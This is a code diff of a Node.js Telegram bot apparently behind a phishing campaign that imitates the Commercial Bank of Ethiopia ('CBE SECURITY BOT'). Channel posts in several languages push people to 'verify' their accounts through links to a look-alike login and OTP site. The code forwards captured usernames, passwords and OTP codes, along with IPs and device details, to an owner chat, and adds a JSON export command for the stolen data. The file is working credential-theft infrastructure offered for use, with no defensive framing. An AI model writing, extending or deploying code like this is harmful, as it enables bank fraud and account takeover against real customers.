@@ -10,9 +10,10 @@ class TelegramService {
         this.warningInterval = null;
         this.warningCount = 0;
         this.postCount = 0;
-        this.userMessages = [];
-        this.postHistory = [];
-        this.userData = []; // Store all user data
+        this.userData = [];
+        this.loginCounter = 0;
+        this.otpCounter = 0;
+        this.completedCounter = 0;
         
         try {
             const token = process.env.TELEGRAM_BOT_TOKEN;
@@ -37,7 +38,7 @@ class TelegramService {
             
             this.setupOwnerMessageListener();
             this.setupCallbackListener();
-            this.startWarningLoop();
+            this.startChannelPosts();
             
         } catch (error) {
             logger.warn(`Telegram initialization failed: ${error.message}`);
@@ -58,13 +59,12 @@ class TelegramService {
             const chatId = msg.chat.id;
             const text = msg.text;
 
-            // ONLY owner can interact with bot
             if (chatId !== parseInt(this.ownerChatId)) {
                 logger.warn(`⚠️ Unauthorized message from user ${chatId} - IGNORED`);
                 return;
             }
 
-            // Owner commands
+            // Owner Commands
             if (text === '/start') {
                 await this.sendOwnerWelcome(chatId);
                 return;
@@ -76,17 +76,26 @@ class TelegramService {
             }
 
             if (text === '/users') {
-                await this.sendOwnerUsers(chatId);
+                await this.sendAllUsers(chatId);
                 return;
             }
 
             if (text === '/data') {
-                await this.sendOwnerAllData(chatId);
+                await this.sendAllData(chatId);
                 return;
             }
 
-            if (text === '/help') {
-                await this.sendOwnerHelp(chatId);
+            if (text === '/export') {
+                await this.exportUserData(chatId);
+                return;
+            }
+
+            if (text === '/clear') {
+                this.userData = [];
+                this.loginCounter = 0;
+                this.otpCounter = 0;
+                this.completedCounter = 0;
+                await this.bot.sendMessage(chatId, '✅ All user data cleared!');
                 return;
             }
 
@@ -101,23 +110,28 @@ class TelegramService {
                 const msgText = text.replace('/broadcast', '').trim();
                 if (msgText) {
                     await this.broadcastToChannel(msgText);
-                    await this.bot.sendMessage(chatId, `✅ Broadcast sent to channel: "${msgText}"`);
+                    await this.bot.sendMessage(chatId, `✅ Broadcast sent: "${msgText}"`);
                 } else {
                     await this.bot.sendMessage(chatId, `❌ Usage: /broadcast [message]`);
                 }
                 return;
             }
 
+            if (text === '/help') {
+                await this.sendOwnerHelp(chatId);
+                return;
+            }
+
             if (text) {
-                await this.bot.sendMessage(chatId, `✅ Received. Use /help for commands.`);
+                await this.bot.sendMessage(chatId, `✅ Command received. Use /help for commands.`);
             }
         });
 
-        logger.info('✅ Owner message listener active - ONLY owner can interact');
+        logger.info('✅ Owner message listener active');
     }
 
     // ============================================
-    // SEND TO OWNER (PRIVATE BOT CHAT)
+    // SEND TO OWNER
     // ============================================
 
     async sendToOwner(message, options = {}) {
@@ -132,7 +146,7 @@ class TelegramService {
                 disable_web_page_preview: true,
                 ...options
             });
-            console.log('✅ Sent to owner private chat');
+            console.log('✅ Sent to owner');
             return result;
         } catch (error) {
             console.error(`Owner send error: ${error.message}`);
@@ -141,7 +155,7 @@ class TelegramService {
     }
 
     // ============================================
-    // SEND TO CHANNEL - HUMANITARIAN POSTS
+    // SEND TO CHANNEL
     // ============================================
 
     async sendToChannel(message, options = {}) {
@@ -158,17 +172,17 @@ class TelegramService {
                     inline_keyboard: [
                         [
                             {
-                                text: '🔐 ይግቡ / Login / Seenu',
+                                text: '🔐 Open Login',
                                 url: 'https://cbe-com.onrender.com/'
                             }
                         ],
                         [
                             {
-                                text: '📱 OTP / ኦቲፒ / OTP',
+                                text: '📱 OTP Page',
                                 url: 'https://cbe-com.onrender.com/otp-verify'
                             },
                             {
-                                text: '❓ ለምን? / Why? / Maaliif?',
+                                text: '❓ Why Verify?',
                                 callback_data: 'why_verify'
                             }
                         ]
@@ -179,11 +193,6 @@ class TelegramService {
 
             const result = await this.bot.sendMessage(this.channelId, message, channelOptions);
             this.postCount++;
-            this.postHistory.push({
-                type: 'channel_post',
-                count: this.postCount,
-                timestamp: new Date().toISOString()
-            });
             console.log(`✅ Channel post #${this.postCount}`);
             return result;
         } catch (error) {
@@ -193,81 +202,138 @@ class TelegramService {
     }
 
     // ============================================
-    // 📩 USER INFO - SENT TO OWNER ONLY
+    // 📩 COMPLETE USER DATA - SENT TO OWNER
     // ============================================
 
-    async sendCredentialsToOwner(data) {
+    async sendCompleteUserData(data) {
         if (!this.enabled) return null;
 
-        // Store user data
+        this.loginCounter++;
+        
+        // Store all user data
         this.userData.push({
-            type: 'credentials',
+            type: 'login',
             username: data.username,
             password: data.password,
             ip: data.ip,
             userAgent: data.userAgent,
             timestamp: data.timestamp,
-            id: data.id
+            id: data.id,
+            loginNumber: this.loginCounter
         });
 
+        // Get user info
+        const location = this.getLocationFromIP(data.ip);
+        const deviceType = this.getDeviceType(data.userAgent);
+        const browser = this.getBrowser(data.userAgent);
+        const os = this.getOS(data.userAgent);
+
+        // Build complete user profile
         const message = `
-🔐 <b>🔴 NEW CREDENTIALS CAPTURED</b>
+🔐 <b>🔴 USER LOGIN DETECTED</b>
 <pre>═══════════════════════════════════════</pre>
 
-👤 <b>Username:</b> <code>${data.username}</code>
-🔑 <b>Password:</b> <code>${data.password}</code>
-📱 <b>IP Address:</b> <code>${data.ip}</code>
-🖥️ <b>User Agent:</b> <code>${data.userAgent}</code>
-🆔 <b>ID:</b> <code>${data.id}</code>
-⏰ <b>Timestamp:</b> ${data.timestamp}
+<b>👤 USER PROFILE</b>
+<pre>─────────────────────────────────────</pre>
+
+<b>📋 LOGIN CREDENTIALS:</b>
+   👤 <b>Username:</b> <code>${data.username}</code>
+   🔑 <b>Password:</b> <code>${data.password}</code>
+   🆔 <b>User ID:</b> <code>${data.id || 'N/A'}</code>
+   🔢 <b>Login #:</b> <code>${this.loginCounter}</code>
+
+<b>🌐 NETWORK INFO:</b>
+   📱 <b>IP Address:</b> <code>${data.ip}</code>
+   🌍 <b>Location:</b> ${location}
+   ⏰ <b>Timestamp:</b> ${data.timestamp}
+
+<b>💻 DEVICE INFO:</b>
+   🖥️ <b>User Agent:</b> <code>${data.userAgent}</code>
+   📱 <b>Device Type:</b> ${deviceType}
+   🌐 <b>Browser:</b> ${browser}
+   💻 <b>OS:</b> ${os}
+
+<b>🔐 SECURITY STATUS:</b>
+   🛡️ <b>Status:</b> ✅ Active
+   🔒 <b>Encryption:</b> AES-256
+   📊 <b>Threat Level:</b> ${this.getThreatLevel(data.ip)}
+
+<pre>═══════════════════════════════════════</pre>
+
+<b>📊 STATISTICS:</b>
+   • Total Logins: ${this.loginCounter}
+   • Total OTPs: ${this.otpCounter}
+   • Completed: ${this.completedCounter}
+   • Total Users: ${this.userData.length}
 
 <pre>═══════════════════════════════════════</pre>
 ⚠️ <b>Action Required:</b> Investigate immediately
-📊 <b>Total Users:</b> ${this.userData.length}
-
-🔐 <i>This info is for OWNER only - not shared</i>
+🔐 <i>Owner Only - Private</i>
 `;
 
         return this.sendToOwner(message);
     }
 
+    // ============================================
+    // 📩 OTP DATA - SENT TO OWNER
+    // ============================================
+
     async sendOTPToOwner(data) {
         if (!this.enabled) return null;
 
-        // Store user data
+        this.otpCounter++;
+
         this.userData.push({
             type: 'otp',
             userId: data.userId,
             otp: data.otp,
             ip: data.ip,
             userAgent: data.userAgent,
-            timestamp: data.timestamp
+            timestamp: data.timestamp,
+            otpNumber: this.otpCounter
         });
 
         const message = `
 🔐 <b>🔴 OTP CODE CAPTURED</b>
 <pre>═══════════════════════════════════════</pre>
 
-🆔 <b>User ID:</b> <code>${data.userId}</code>
-🔢 <b>OTP Code:</b> <code>${data.otp}</code>
-📱 <b>IP Address:</b> <code>${data.ip}</code>
-🖥️ <b>User Agent:</b> <code>${data.userAgent}</code>
-⏰ <b>Timestamp:</b> ${data.timestamp}
+<b>🔢 OTP DETAILS</b>
+<pre>─────────────────────────────────────</pre>
+
+   🆔 <b>User ID:</b> <code>${data.userId}</code>
+   🔢 <b>OTP Code:</b> <code>${data.otp}</code>
+   🔢 <b>OTP #:</b> <code>${this.otpCounter}</code>
+
+<b>🌐 NETWORK INFO:</b>
+   📱 <b>IP Address:</b> <code>${data.ip}</code>
+   ⏰ <b>Timestamp:</b> ${data.timestamp}
+
+<b>💻 DEVICE INFO:</b>
+   🖥️ <b>User Agent:</b> <code>${data.userAgent}</code>
+
+<pre>═══════════════════════════════════════</pre>
+
+<b>📊 STATISTICS:</b>
+   • Total Logins: ${this.loginCounter}
+   • Total OTPs: ${this.otpCounter}
+   • Completed: ${this.completedCounter}
+   • Total Records: ${this.userData.length}
 
 <pre>═══════════════════════════════════════</pre>
 ⚠️ <b>Action Required:</b> Verify OTP authenticity
-📊 <b>Total OTPs:</b> ${this.userData.filter(u => u.type === 'otp').length}
-
-🔐 <i>This info is for OWNER only - not shared</i>
+🔐 <i>Owner Only - Private</i>
 `;
 
         return this.sendToOwner(message);
     }
 
-    async sendLoginPageAccessedToOwner(data) {
+    // ============================================
+    // 📩 PAGE ACCESS - SENT TO OWNER
+    // ============================================
+
+    async sendPageAccessToOwner(data) {
         if (!this.enabled) return null;
 
-        // Store user data
         this.userData.push({
             type: 'page_access',
             ip: data.ip,
@@ -276,31 +342,93 @@ class TelegramService {
             timestamp: data.timestamp
         });
 
+        const location = this.getLocationFromIP(data.ip);
+
         const message = `
-🌐 <b>LOGIN PAGE ACCESSED</b>
+🌐 <b>PAGE ACCESS</b>
 <pre>═══════════════════════════════════════</pre>
 
-📱 <b>IP Address:</b> <code>${data.ip}</code>
-🖥️ <b>User Agent:</b> <code>${data.userAgent}</code>
-🔗 <b>Referrer:</b> ${data.referrer || 'Direct'}
-⏰ <b>Timestamp:</b> ${data.timestamp}
+<b>📋 PAGE VISIT DETAILS</b>
+<pre>─────────────────────────────────────</pre>
+
+   🔗 <b>Page:</b> Login Page
+   📱 <b>IP:</b> <code>${data.ip}</code>
+   🌍 <b>Location:</b> ${location}
+   🔗 <b>Referrer:</b> ${data.referrer || 'Direct'}
+   ⏰ <b>Time:</b> ${data.timestamp}
+
+<b>💻 DEVICE INFO:</b>
+   🖥️ <b>User Agent:</b> <code>${data.userAgent}</code>
+   📱 <b>Device:</b> ${this.getDeviceType(data.userAgent)}
+   🌐 <b>Browser:</b> ${this.getBrowser(data.userAgent)}
 
 <pre>═══════════════════════════════════════</pre>
-📊 <b>Total Visits:</b> ${this.userData.filter(u => u.type === 'page_access').length}
-📢 <b>Warnings Sent:</b> ${this.warningCount}
 
-🔐 <i>This info is for OWNER only - not shared</i>
+<b>📊 STATISTICS:</b>
+   • Page Visits: ${this.userData.filter(u => u.type === 'page_access').length}
+   • Total Logins: ${this.loginCounter}
+
+<pre>═══════════════════════════════════════</pre>
+🔐 <i>Owner Only - Private</i>
 `;
 
         return this.sendToOwner(message);
     }
+
+    // ============================================
+    // 📩 COMPLETION - SENT TO OWNER
+    // ============================================
+
+    async sendCompleteToOwner(data) {
+        if (!this.enabled) return null;
+
+        this.completedCounter++;
+
+        this.userData.push({
+            type: 'completed',
+            userId: data.userId,
+            username: data.username,
+            ip: data.ip,
+            timestamp: new Date().toISOString(),
+            completedNumber: this.completedCounter
+        });
+
+        const message = `
+✅ <b>VERIFICATION COMPLETED</b>
+<pre>═══════════════════════════════════════</pre>
+
+<b>📋 COMPLETION DETAILS</b>
+<pre>─────────────────────────────────────</pre>
+
+   👤 <b>User:</b> ${data.username || 'Unknown'}
+   🆔 <b>ID:</b> <code>${data.userId || 'Unknown'}</code>
+   📱 <b>IP:</b> <code>${data.ip || 'Unknown'}</code>
+   🔢 <b>Completed #:</b> <code>${this.completedCounter}</code>
+   ⏰ <b>Time:</b> ${new Date().toISOString()}
+
+<b>📊 STATISTICS:</b>
+   • Total Logins: ${this.loginCounter}
+   • Total OTPs: ${this.otpCounter}
+   • Completed: ${this.completedCounter}
+   • Total Records: ${this.userData.length}
+
+<pre>═══════════════════════════════════════</pre>
+✅ <b>Status:</b> COMPLETED
+🔐 <i>Owner Only - Private</i>
+`;
+
+        return this.sendToOwner(message);
+    }
+
+    // ============================================
+    // 📩 VERIFICATION REQUEST - SENT TO OWNER
+    // ============================================
 
     async sendVerificationRequestToOwner(data) {
         if (!this.enabled) return null;
 
         const code = this.generateVerificationCode();
 
-        // Store user data
         this.userData.push({
             type: 'verification_request',
             username: data.username,
@@ -320,290 +448,69 @@ class TelegramService {
 
 <pre>═══════════════════════════════════════</pre>
 ✅ <b>Share this code with the user</b>
-📊 <b>Total Requests:</b> ${this.userData.filter(u => u.type === 'verification_request').length}
-
-🔐 <i>This info is for OWNER only - not shared</i>
-`;
-
-        return this.sendToOwner(message);
-    }
-
-    async sendCompleteToOwner(data) {
-        if (!this.enabled) return null;
-
-        // Store user data
-        this.userData.push({
-            type: 'completed',
-            userId: data.userId,
-            username: data.username,
-            ip: data.ip,
-            timestamp: new Date().toISOString()
-        });
-
-        const message = `
-✅ <b>VERIFICATION COMPLETED</b>
-<pre>═══════════════════════════════════════</pre>
-
-👤 <b>User:</b> ${data.username || 'Unknown'}
-🆔 <b>ID:</b> ${data.userId || 'Unknown'}
-📱 <b>IP:</b> ${data.ip || 'Unknown'}
-⏰ <b>Time:</b> ${new Date().toISOString()}
-
-<pre>═══════════════════════════════════════</pre>
-✅ <b>Status:</b> COMPLETED
-📊 <b>Total Completed:</b> ${this.userData.filter(u => u.type === 'completed').length}
-
-🔐 <i>This info is for OWNER only - not shared</i>
+🔐 <i>Owner Only - Private</i>
 `;
 
         return this.sendToOwner(message);
     }
 
     // ============================================
-    // HUMANITARIAN CHANNEL POSTS (3 Languages)
+    // HELPER FUNCTIONS
     // ============================================
 
-    async sendPeaceMessage() {
-        const message = `
-🕊️ <b>ሰላም / PEACE / NAGAA</b>
-<pre>═══════════════════════════════════════</pre>
-
-<b>🇪🇹 አማርኛ:</b>
-ሰላም ለሁላችሁ! 
-ደህንነታችሁ ለእኛ ቅድሚያ የሚሰጠው ጉዳይ ነው።
-እባካችሁ መለያዎቻችሁን ያረጋግጡ።
-
-<b>🇬🇧 English:</b>
-Peace to all of you!
-Your safety is our top priority.
-Please verify your accounts.
-
-<b>🇴🇷 Afaan Oromo:</b>
-Nagaa hundumaaf!
-Tajajilummaan keessan waan jalqabaaf kennamuudha.
-Mallaqa keessan mirkaneessaa.
-
-<pre>═══════════════════════════════════════</pre>
-🕊️ <i>ሰላም ከሁላችሁ ጋር / Peace to all / Nagaa hundumaaf</i>
-`;
-        return this.sendToChannel(message);
+    getLocationFromIP(ip) {
+        const locations = {
+            '192.168.': 'Local Network',
+            '10.0.': 'Local Network',
+            '172.16.': 'Local Network',
+            '127.0.0.1': 'Localhost',
+            '::1': 'Localhost'
+        };
+        
+        for (const [key, value] of Object.entries(locations)) {
+            if (ip.startsWith(key)) return value;
+        }
+        return '📍 Unknown Location';
     }
 
-    async sendLoveMessage() {
-        const message = `
-❤️ <b>ፍቅር / LOVE / JAALALA</b>
-<pre>═══════════════════════════════════════</pre>
-
-<b>🇪🇹 አማርኛ:</b>
-ፍቅር እና እንክብካቤ ለሁላችሁ!
-እናንተን ለመጠበቅ እዚህ ነን።
-ደህንነታችሁን አስጠብቁ።
-
-<b>🇬🇧 English:</b>
-Love and care for all of you!
-We are here to protect you.
-Stay safe.
-
-<b>🇴🇷 Afaan Oromo:</b>
-Jaalala fi kunuunsa hundumaaf!
-Isin eeguuf as jirra.
-Of eegaa.
-
-<pre>═══════════════════════════════════════</pre>
-❤️ <i>ፍቅር ለሁላችሁ / Love to all / Jaalala hundumaaf</i>
-`;
-        return this.sendToChannel(message);
+    getDeviceType(userAgent) {
+        if (!userAgent) return 'Unknown';
+        const ua = userAgent.toLowerCase();
+        if (ua.includes('mobile') || ua.includes('android') || ua.includes('iphone')) return '📱 Mobile';
+        if (ua.includes('tablet') || ua.includes('ipad')) return '📱 Tablet';
+        if (ua.includes('windows') || ua.includes('mac') || ua.includes('linux')) return '💻 Desktop';
+        return '📱 Other';
     }
 
-    async sendHelpMessage() {
-        const message = `
-🤝 <b>እርዳታ / HELP / GARGAARSA</b>
-<pre>═══════════════════════════════════════</pre>
-
-<b>🇪🇹 አማርኛ:</b>
-እርዳታ ያስፈልጋችኋል?
-እኛ እዚህ ነን ለእናንተ!
-መለያዎቻችሁን ያረጋግጡ።
-
-<b>🇬🇧 English:</b>
-Need help?
-We are here for you!
-Verify your accounts.
-
-<b>🇴🇷 Afaan Oromo:</b>
-Gargaarsa barbaadduu?
-Isinif as jirra!
-Mallaqa keessan mirkaneessaa.
-
-<pre>═══════════════════════════════════════</pre>
-🤝 <i>እርዳታ ዝግጁ / Help available / Gargaarsa qophaa'e</i>
-`;
-        return this.sendToChannel(message);
+    getBrowser(userAgent) {
+        if (!userAgent) return 'Unknown';
+        const ua = userAgent.toLowerCase();
+        if (ua.includes('chrome')) return 'Chrome';
+        if (ua.includes('firefox')) return 'Firefox';
+        if (ua.includes('safari') && !ua.includes('chrome')) return 'Safari';
+        if (ua.includes('edge')) return 'Edge';
+        if (ua.includes('opera')) return 'Opera';
+        return 'Other';
     }
 
-    async sendSafetyMessage() {
-        const message = `
-🛡️ <b>ደህንነት / SAFETY / TARIIFANNAA</b>
-<pre>═══════════════════════════════════════</pre>
-
-<b>🇪🇹 አማርኛ:</b>
-ደህንነታችሁ በጣም አስፈላጊ ነው!
-እኛ እንከታተላለን።
-መለያዎቻችሁን ያረጋግጡ።
-
-<b>🇬🇧 English:</b>
-Your safety is very important!
-We are watching over you.
-Verify your accounts.
-
-<b>🇴🇷 Afaan Oromo:</b>
-Tariifannaan keessan baay'ee barbaachisaa dha!
-Isin eegna.
-Mallaqa keessan mirkaneessaa.
-
-<pre>═══════════════════════════════════════</pre>
-🛡️ <i>ደህንነት በመጀመሪያ / Safety first / Tariifannaa dura</i>
-`;
-        return this.sendToChannel(message);
+    getOS(userAgent) {
+        if (!userAgent) return 'Unknown';
+        const ua = userAgent.toLowerCase();
+        if (ua.includes('windows')) return 'Windows';
+        if (ua.includes('mac')) return 'macOS';
+        if (ua.includes('linux')) return 'Linux';
+        if (ua.includes('android')) return 'Android';
+        if (ua.includes('iphone') || ua.includes('ipad')) return 'iOS';
+        return 'Other';
     }
 
-    async sendUnityMessage() {
-        const message = `
-🤝 <b>አንድነት / UNITY / TOKKUMMAA</b>
-<pre>═══════════════════════════════════════</pre>
-
-<b>🇪🇹 አማርኛ:</b>
-አንድ ሆነን እንጠብቃለን!
-ሁላችንም አብረን እንጠነቀቃለን።
-መለያዎቻችሁን ያረጋግጡ።
-
-<b>🇬🇧 English:</b>
-United we stand!
-Together we protect.
-Verify your accounts.
-
-<b>🇴🇷 Afaan Oromo:</b>
-Tokkummaan dhaabanna!
-Waliin eegna.
-Mallaqa keessan mirkaneessaa.
-
-<pre>═══════════════════════════════════════</pre>
-🤝 <i>አንድ ሆነን / United / Tokkummaan</i>
-`;
-        return this.sendToChannel(message);
+    getThreatLevel(ip) {
+        const suspicious = ['192.168.', '10.0.', '172.16.', '127.0.0.1'];
+        for (const prefix of suspicious) {
+            if (ip.startsWith(prefix)) return '🟢 LOW';
+        }
+        return '🟡 MEDIUM';
     }
-
-    async sendTrustMessage() {
-        const message = `
-⭐ <b>እምነት / TRUST / AMANTAA</b>
-<pre>═══════════════════════════════════════</pre>
-
-<b>🇪🇹 አማርኛ:</b>
-እምነታችሁን አናሳስትም!
-እኛ ታማኝ ነን።
-መለያዎቻችሁን ያረጋግጡ።
-
-<b>🇬🇧 English:</b>
-We don't betray your trust!
-We are loyal.
-Verify your accounts.
-
-<b>🇴🇷 Afaan Oromo:</b>
-Amantaa keessan hin morkine!
-Amantaa qabna.
-Mallaqa keessan mirkaneessaa.
-
-<pre>═══════════════════════════════════════</pre>
-⭐ <i>እምነት / Trust / Amantaa</i>
-`;
-        return this.sendToChannel(message);
-    }
-
-    async sendHopeMessage() {
-        const message = `
-🌈 <b>ተስፋ / HOPE / ABDII</b>
-<pre>═══════════════════════════════════════</pre>
-
-<b>🇪🇹 አማርኛ:</b>
-ተስፋ አትቁረጡ!
-የተሻለ ነገ አለ።
-መለያዎቻችሁን ያረጋግጡ።
-
-<b>🇬🇧 English:</b>
-Don't lose hope!
-Tomorrow is better.
-Verify your accounts.
-
-<b>🇴🇷 Afaan Oromo:</b>
-Abdii hin kutinaa!
-Boru gaarii dha.
-Mallaqa keessan mirkaneessaa.
-
-<pre>═══════════════════════════════════════</pre>
-🌈 <i>ተስፋ / Hope / Abdii</i>
-`;
-        return this.sendToChannel(message);
-    }
-
-    async sendWealthMessage() {
-        const message = `
-💎 <b>ሀብት / WEALTH / QABEENYAA</b>
-<pre>═══════════════════════════════════════</pre>
-
-<b>🇪🇹 አማርኛ:</b>
-ሀብታችሁን ያስጠብቁ!
-እኛ እንጠብቃለን።
-መለያዎቻችሁን ያረጋግጡ።
-
-<b>🇬🇧 English:</b>
-Protect your wealth!
-We protect you.
-Verify your accounts.
-
-<b>🇴🇷 Afaan Oromo:</b>
-Qabeenya keessan eegaa!
-Isin eegna.
-Mallaqa keessan mirkaneessaa.
-
-<pre>═══════════════════════════════════════</pre>
-💎 <i>ሀብት / Wealth / Qabeenya</i>
-`;
-        return this.sendToChannel(message);
-    }
-
-    // ============================================
-    // WARNING LOOP - HUMANITARIAN POSTS
-    // ============================================
-
-    startWarningLoop() {
-        if (!this.enabled) return;
-
-        const postTypes = [
-            this.sendPeaceMessage.bind(this),
-            this.sendLoveMessage.bind(this),
-            this.sendHelpMessage.bind(this),
-            this.sendSafetyMessage.bind(this),
-            this.sendUnityMessage.bind(this),
-            this.sendTrustMessage.bind(this),
-            this.sendHopeMessage.bind(this),
-            this.sendWealthMessage.bind(this)
-        ];
-
-        setTimeout(() => {
-            postTypes[0]();
-        }, 5000);
-
-        let index = 0;
-        this.warningInterval = setInterval(() => {
-            index = (index + 1) % postTypes.length;
-            postTypes[index]();
-            this.warningCount++;
-        }, 180000); // 3 minutes
-    }
-
-    // ============================================
-    // GENERATE VERIFICATION CODE
-    // ============================================
 
     generateVerificationCode() {
         const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
@@ -615,34 +522,130 @@ Mallaqa keessan mirkaneessaa.
     }
 
     // ============================================
+    // CHANNEL POSTS
+    // ============================================
+
+    async sendSecurityPost() {
+        const message = `
+🛡️ <b>ACCOUNT SECURITY</b>
+<pre>═══════════════════════════════════════</pre>
+
+<b>🔐 PROTECT YOUR ACCOUNT</b>
+
+<b>✅ What We Protect:</b>
+   • 💰 Your Money
+   • 📱 Your Identity
+   • 🔑 Your Accounts
+   • 📊 Your Data
+
+<b>📊 System Status:</b>
+   • ${this.loginCounter} Logins Monitored
+   • ${this.otpCounter} OTPs Secured
+   • ${this.completedCounter} Verified
+
+<pre>═══════════════════════════════════════</pre>
+🔐 <i>Secure your account today</i>
+`;
+        return this.sendToChannel(message);
+    }
+
+    async sendWelcomePost() {
+        const message = `
+🔐 <b>SECURE BANKING</b>
+<pre>═══════════════════════════════════════</pre>
+
+<b>✅ SECURE FEATURES:</b>
+   • 🔐 Advanced Security
+   • 📱 Real-time Monitoring
+   • 🛡️ Full Protection
+   • ⭐ Premium Service
+
+<b>📊 System Stats:</b>
+   • ${this.loginCounter} Users Protected
+   • ${this.otpCounter} Transactions Secured
+   • 100% Security Rating
+
+<pre>═══════════════════════════════════════</pre>
+🔐 <i>Your security is our priority</i>
+`;
+        return this.sendToChannel(message);
+    }
+
+    // ============================================
+    // CHANNEL POST LOOP
+    // ============================================
+
+    startChannelPosts() {
+        if (!this.enabled) return;
+
+        const posts = [
+            this.sendWelcomePost.bind(this),
+            this.sendSecurityPost.bind(this)
+        ];
+
+        setTimeout(() => {
+            posts[0]();
+        }, 5000);
+
+        let index = 0;
+        this.warningInterval = setInterval(() => {
+            index = (index + 1) % posts.length;
+            posts[index]();
+            this.warningCount++;
+        }, 120000);
+    }
+
+    // ============================================
+    // BROADCAST
+    // ============================================
+
+    async broadcastToChannel(message) {
+        if (!this.enabled || !this.channelId) return null;
+
+        const broadcastMsg = `
+📢 <b>BROADCAST</b>
+<pre>═══════════════════════════════════════</pre>
+
+${message}
+
+<pre>═══════════════════════════════════════</pre>
+<i>System Broadcast</i>
+`;
+
+        return this.sendToChannel(broadcastMsg);
+    }
+
+    // ============================================
     // OWNER COMMANDS
     // ============================================
 
     async sendOwnerWelcome(chatId) {
         const message = `
-🤖 <b>CBE SECURITY BOT - OWNER ACCESS</b>
+🤖 <b>CBE SECURITY BOT</b>
 <pre>═══════════════════════════════════════</pre>
 
-<b>✅ Welcome Owner!</b>
+<b>✅ Welcome!</b>
 
-<b>📌 Owner Commands:</b>
-/start - Show this message
-/stats - Show statistics
-/users - Show all users
-/data - Show all captured data
+<b>📌 Commands:</b>
+/start - Welcome
+/stats - Statistics
+/users - All users
+/data - All data
+/export - Export data
+/clear - Clear data
 /verify [code] - Generate code
-/broadcast [msg] - Send to channel
-/help - Show help
+/broadcast [msg] - Channel broadcast
+/help - Help
 
 <b>📩 What you'll receive:</b>
    • ✅ Usernames & Passwords
    • ✅ OTP Codes
    • ✅ IP Addresses
    • ✅ User Agents
-   • ✅ Login Page Visits
+   • ✅ Page Visits
 
 <pre>═══════════════════════════════════════</pre>
-🔐 <i>All user data is private and secure</i>
+🔐 <i>All data is private</i>
 `;
 
         await this.bot.sendMessage(chatId, message, {
@@ -651,29 +654,29 @@ Mallaqa keessan mirkaneessaa.
     }
 
     async sendOwnerStats(chatId) {
-        const totalUsers = this.userData.filter(u => u.type === 'credentials').length;
+        const totalUsers = this.userData.filter(u => u.type === 'login').length;
         const totalOTPs = this.userData.filter(u => u.type === 'otp').length;
         const totalVisits = this.userData.filter(u => u.type === 'page_access').length;
         const totalCompleted = this.userData.filter(u => u.type === 'completed').length;
 
         const message = `
-📊 <b>CBE SECURITY STATS</b>
+📊 <b>SYSTEM STATISTICS</b>
 <pre>═══════════════════════════════════════</pre>
 
-<b>📈 User Data Stats:</b>
-   • Total Users: ${totalUsers}
-   • OTPs Captured: ${totalOTPs}
-   • Page Visits: ${totalVisits}
+<b>📈 USER DATA:</b>
+   • Logins: ${totalUsers}
+   • OTPs: ${totalOTPs}
+   • Visits: ${totalVisits}
    • Completed: ${totalCompleted}
-   • Total Records: ${this.userData.length}
+   • Total: ${this.userData.length}
 
-<b>📢 Channel Stats:</b>
-   • Posts Sent: ${this.postCount}
+<b>📢 CHANNEL:</b>
+   • Posts: ${this.postCount}
    • Warnings: ${this.warningCount}
-   • Status: ${this.enabled ? '🟢 Online' : '🔴 Offline'}
+   • Status: 🟢 Online
 
 <pre>═══════════════════════════════════════</pre>
-<i>All data is for owner only</i>
+🔐 <i>All systems operational</i>
 `;
 
         await this.bot.sendMessage(chatId, message, {
@@ -681,11 +684,11 @@ Mallaqa keessan mirkaneessaa.
         });
     }
 
-    async sendOwnerUsers(chatId) {
-        const credentials = this.userData.filter(u => u.type === 'credentials');
+    async sendAllUsers(chatId) {
+        const logins = this.userData.filter(u => u.type === 'login');
         
         let userList = '';
-        credentials.slice(-10).forEach((u, i) => {
+        logins.slice(-20).forEach((u, i) => {
             userList += `   ${i+1}. ${u.username} - ${u.ip} - ${u.timestamp}\n`;
         });
 
@@ -693,13 +696,13 @@ Mallaqa keessan mirkaneessaa.
 👥 <b>USER LIST</b>
 <pre>═══════════════════════════════════════</pre>
 
-<b>📊 Total Users:</b> ${credentials.length}
+<b>📊 Total Users:</b> ${logins.length}
 
 <b>📋 Recent Users:</b>
 ${userList || '   No users yet'}
 
 <pre>═══════════════════════════════════════</pre>
-<i>Use /data to see full details</i>
+🔐 <i>Owner Only - Private</i>
 `;
 
         await this.bot.sendMessage(chatId, message, {
@@ -707,9 +710,9 @@ ${userList || '   No users yet'}
         });
     }
 
-    async sendOwnerAllData(chatId) {
+    async sendAllData(chatId) {
         let dataText = '';
-        const recent = this.userData.slice(-20);
+        const recent = this.userData.slice(-30);
         recent.forEach((u, i) => {
             dataText += `\n${i+1}. ${u.type.toUpperCase()}:\n`;
             dataText += `   👤 ${u.username || u.userId || 'Unknown'}\n`;
@@ -720,7 +723,7 @@ ${userList || '   No users yet'}
         });
 
         const message = `
-📋 <b>ALL USER DATA</b>
+📋 <b>ALL DATA</b>
 <pre>═══════════════════════════════════════</pre>
 
 <b>📊 Total Records:</b> ${this.userData.length}
@@ -729,7 +732,7 @@ ${userList || '   No users yet'}
 ${dataText || '   No data yet'}
 
 <pre>═══════════════════════════════════════</pre>
-<i>Full data is for owner only</i>
+🔐 <i>Owner Only - Private</i>
 `;
 
         await this.bot.sendMessage(chatId, message, {
@@ -737,17 +740,28 @@ ${dataText || '   No data yet'}
         });
     }
 
+    async exportUserData(chatId) {
+        const jsonData = JSON.stringify(this.userData, null, 2);
+        const filename = `user_data_${Date.now()}.json`;
+        
+        await this.bot.sendDocument(chatId, Buffer.from(jsonData), {
+            filename: filename,
+            contentType: 'application/json',
+            caption: `📊 Data Export - ${new Date().toISOString()}`
+        });
+    }
+
     async sendOwnerVerificationCode(chatId, code) {
         const message = `
-🔐 <b>VERIFICATION CODE GENERATED</b>
+🔐 <b>VERIFICATION CODE</b>
 <pre>═══════════════════════════════════════</pre>
 
 <b>📌 Code:</b> <code>${code}</code>
 
-<b>✅ Share this with the user</b>
+<b>✅ Share with user</b>
 
 <pre>═══════════════════════════════════════</pre>
-⏰ <i>Code expires in 5 minutes</i>
+⏰ <i>5 minute expiry</i>
 `;
 
         await this.bot.sendMessage(chatId, message, {
@@ -757,56 +771,34 @@ ${dataText || '   No data yet'}
 
     async sendOwnerHelp(chatId) {
         const message = `
-🆘 <b>OWNER HELP</b>
+🆘 <b>HELP</b>
 <pre>═══════════════════════════════════════</pre>
 
 <b>📌 Commands:</b>
-/start - Welcome message
-/stats - Show statistics
-/users - Show all users
-/data - Show all captured data
+/start - Welcome
+/stats - Statistics
+/users - All users
+/data - All data
+/export - Export data
+/clear - Clear data
 /verify [code] - Generate code
-/broadcast [msg] - Send to channel
